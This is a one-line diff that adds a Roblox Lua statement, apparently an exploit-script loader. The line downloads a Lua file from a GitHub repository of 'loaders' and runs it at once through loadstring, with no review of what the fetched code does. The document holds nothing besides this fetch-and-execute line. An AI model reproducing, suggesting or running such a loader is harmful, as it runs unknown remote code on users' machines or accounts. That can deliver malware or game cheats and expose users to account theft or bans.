@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/PanelTrailNight/loaders/main/loaders/kukirin-life-testing-spam7-3vkojna4fbjhrg.lua"))()
